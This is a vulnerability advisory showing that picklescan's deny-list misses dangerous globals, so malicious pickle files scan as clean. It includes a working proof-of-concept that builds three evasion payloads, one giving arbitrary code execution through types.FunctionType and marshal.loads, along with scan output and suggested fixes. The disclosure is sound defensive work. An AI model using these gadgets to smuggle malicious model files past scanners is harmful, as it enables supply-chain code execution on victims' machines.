# picklescan: deny-list evasion lets malicious pickles pass as clean

**Package**: picklescan
**Ecosystem**: PyPI
**Affected versions**: `<= 1.0.4` (current latest; main branch)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` — **6.1** (scanner false-negative enabling downstream code execution; calibrated to vendor precedent for picklescan deny-list CVEs)
**CWE**: CWE-693 (Protection Mechanism Failure), CWE-184 (Incomplete Deny-list)

## Summary

picklescan classifies any global whose `(module, name)` is not in its deny-list
(`_unsafe_globals`) as `SafetyLevel.Suspicious`. The Suspicious tier does **not**
increment `issues_count` or `infected_files`, so the scanner reports the file as
carrying no malware (`issues_count = 0`, CLI exit `0`) while a real unpickler resolves
and calls the global. Because the deny-list is the sole security boundary, every
dangerous callable missing from it is a bypass. Three live bypass gadgets are
demonstrated below, including one that yields arbitrary code execution. A separate
minor defect causes `python -m picklescan` to always exit `0`.

## Root cause

In `picklescan/scanner.py`, classification assigns Suspicious to anything not
explicitly listed, and only Dangerous bumps the issue counter:

```python
# scanner.py (1.0.4)
elif ...:                       # 418/422: deny-listed → Dangerous
    g.safety = SafetyLevel.Dangerous
    issues_count += 1
elif <in _safe_globals>:        # 426: Innocuous  (no increment)
    g.safety = SafetyLevel.Innocuous
else:                           # 428: everything else → Suspicious (no increment)
    g.safety = SafetyLevel.Suspicious
return ScanResult(globals, 1, issues_count, 1 if issues_count > 0 else 0, scan_err)  # 431
```

```python
# cli.py:114
return 0 if scan_result.issues_count == 0 else 1
```

A global that is dangerous in practice but absent from `_unsafe_globals` therefore
travels the `else` branch → Suspicious → `issues_count` stays `0` → exit `0` (clean).

The deny-list entries the gadgets evade:

```python
# scanner.py
"types": {"CodeType"},                          # line 150 — FunctionType NOT listed
"_io":   {"FileIO"},                            # line 159 — the io.FileIO alias NOT listed
"code":  {"InteractiveInterpreter.runcode"},    # line 182 — InteractiveConsole.push NOT listed
```

## Proof of concept

The harness builds each payload, scans it with the **real** installed picklescan
1.0.4, then executes it in a **separate** `python -c "pickle.load(...)"` subprocess.
Oracle = a sentinel file the payload writes on load. A negative control uses the
**deny-listed** `_io.FileIO` (the same file-create capability) to show the scanner
correctly flags the listed name and only misses the aliases.

```python
import io, os, sys, pickle, marshal, struct, code, subprocess, tempfile
from picklescan.scanner import scan_pickle_bytes

def scan(b):
    r = scan_pickle_bytes(io.BytesIO(b), "poc")
    return r.issues_count, r.infected_files, [(g.module, g.name, g.safety.value) for g in r.globals]

def execute(b):  # real, separate unpickler
    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as f:
        f.write(b); fn = f.name
    subprocess.run([sys.executable, "-c",
                    "import pickle,sys; pickle.load(open(sys.argv[1],'rb'))", fn])
    os.unlink(fn)

# --- minimal protocol-4 opcode assembler ---
g  = lambda m,n: b"c"+m.encode()+b"\n"+n.encode()+b"\n"
u  = lambda s: b"\x8c"+bytes([len(s)])+s.encode()
bb = lambda x: b"\x8e"+struct.pack("<Q",len(x))+x
call = lambda c,*a: c+b"("+b"".join(a)+b"tR"

# V2a: io.FileIO (alias of deny-listed _io.FileIO) — creates/truncates a file
io_fileio = b"\x80\x04"+call(g("io","FileIO"), u("/tmp/psc_v2a"), u("w"))+b"."

# V2b: types.FunctionType(marshal.loads(<code>), {})() — arbitrary code execution
co = marshal.dumps(compile("open('/tmp/psc_v2b','w').write('pwned')","<poc>","exec"))
rce = b"\x80\x04"+call(g("types","FunctionType"), call(g("marshal","loads"), bb(co)), b"}")+b")R."

# V1: code.InteractiveConsole.push — compiles + exec()s its argument
class V1:
    def __reduce__(self):
        return (code.InteractiveConsole.push,
                (code.InteractiveConsole(), "open('/tmp/psc_v1','w').write('x')"))
v1 = pickle.dumps(V1(), protocol=4)

for name, payload in [("V1 InteractiveConsole.push", v1),
                      ("V2a io.FileIO alias", io_fileio),
                      ("V2b FunctionType+marshal RCE", rce)]:
    ic, inf, globs = scan(payload)
    print(name, "-> issues=%d infected=%d globals=%s" % (ic, inf, globs))
    execute(payload)
```

### Observed output (real picklescan 1.0.4, CPython 3.14.6)

```
[V1] code.InteractiveConsole.push
  globals: [('codeop','CommandCompiler','suspicious'), ('code','InteractiveConsole','suspicious'),
            ('code','InteractiveConsole.push','suspicious'), ('codeop','Compile','suspicious')]
  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   => BYPASS

[V2a] io.FileIO alias -> file create
  globals: [('io','FileIO','suspicious')]
  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   => BYPASS

[V2b] types.FunctionType + marshal.loads -> arbitrary code execution
  globals: [('marshal','loads','suspicious'), ('types','FunctionType','suspicious')]
  issues_count=0 infected_files=0 cli_exit=0 (CLEAN)   payload executed: True   => BYPASS

[CONTROL] _io.FileIO (deny-listed) -> SAME file-create capability
  globals: [('_io','FileIO','dangerous')]
  issues_count=1 infected_files=1 cli_exit=1 (FLAGGED) payload executed: True   => correctly flagged
```

The control confirms the differentiator is purely the missing deny-list entry: the
identical file-create capability is flagged as Dangerous under `_io.FileIO` but passes
clean under the `io.FileIO` alias.

## Impact

An attacker can ship a malicious model/pickle file (`.pkl`, `.pt`, `.bin`, etc.) that
picklescan reports as clean (exit 0) while it executes arbitrary Python on
`pickle.load` / `torch.load`. This defeats picklescan's entire purpose as a
supply-chain safety gate (CLI `-p`, `scan_huggingface_model`, CI gates on downloaded
models). `types.FunctionType` + `marshal.loads` is the full-RCE vector;
`io.FileIO`/`code.InteractiveConsole.push` give arbitrary file create/truncate and
`exec()` respectively.

This is the same mechanism class as prior picklescan deny-list CVEs (e.g.
CVE-2025-1716 `pip`, CVE-2025-46417 `ssl`) — one missing global per CVE. The specific
gadgets here are not in any published advisory and are live on the current release.

## Additional defect — `python -m picklescan` ignores its exit code

`__main__.py:3` calls `main()` without `sys.exit(main())`, so the `-m` invocation
always exits `0` even when it prints a Dangerous finding. The setuptools console
script (`picklescan = picklescan.cli:main`) wraps `sys.exit` correctly, so only the
module form is affected — but a CI gate keyed on the documented exit codes via
`python -m picklescan` passes files picklescan itself flagged. Observed:

```
$ python -m picklescan -p dangerous__io_FileIO.pkl
.../tmp.pkl: dangerous import '_io FileIO' FOUND
----------- SCAN SUMMARY -----------  Infected files: 1 ...
$ echo $?
0          # exit-code bug: should be 1
```

## Suggested fix

1. Treat `SafetyLevel.Suspicious` as a non-zero result (or move to an allowlist-only
   model where only `_safe_globals` passes clean). A deny-list as the sole boundary
   means every omission is a silent bypass.
2. Close the demonstrated gaps: block the `code`/`codeop` modules wholesale, add
   `io.FileIO` alongside `_io.FileIO`, and add `types.FunctionType` + `marshal`
   (`loads`/`load`) to `_unsafe_globals`.
3. Fix `__main__.py` to `sys.exit(main())`.

## Note — 7z member-name containment (investigated, not currently exploitable)

`scan_7z_bytes` extracts archive members by name with no path containment of its own.
With the pinned `py7zr==0.22.0` this is not exploitable: py7zr rejects `..`/absolute
member names at both write and extract (post CVE-2022-44900 hardening), so no
traversal archive reaches the scanner's `open`. It is a latent defense-in-depth gap
that would re-open against an older or unpinned py7zr; picklescan should add its own
containment rather than rely on the dependency.
